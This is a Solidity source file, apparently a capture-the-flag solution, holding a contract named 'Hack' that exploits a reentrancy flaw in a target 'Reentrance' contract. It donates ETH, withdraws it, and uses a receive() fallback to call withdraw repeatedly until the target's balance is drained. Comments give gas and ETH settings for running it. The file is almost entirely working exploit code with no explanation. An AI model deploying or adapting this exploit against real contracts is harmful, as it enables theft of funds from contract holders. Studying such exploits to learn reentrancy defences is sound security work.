// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance 
{
  function balances(address ) external view returns(uint);
  function donate(address _to) external payable ;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external ;
}


// Set  Gas Limit to max in Metamask
contract Hack 
{
    IReentrance public i;
    uint public  loop;    // 21
    uint public amount;
    constructor(address  j) public  
    {
        i = IReentrance(j);
    }
    function attack() public payable // 0.00005 ETH   ==   50000000000000 wei
    {
        amount = msg.value;
        i.donate{value:amount}(address(this));
        i.withdraw(amount); 
    }
    
    function min(uint a,uint b) public pure returns(uint){ return a>b ?b :a; }
    
    receive() external payable 
    { 
        loop ++;
        uint b = min(address(i).balance,amount);
        if(b>0)
        {
            i.withdraw(b);
        }
    }
}
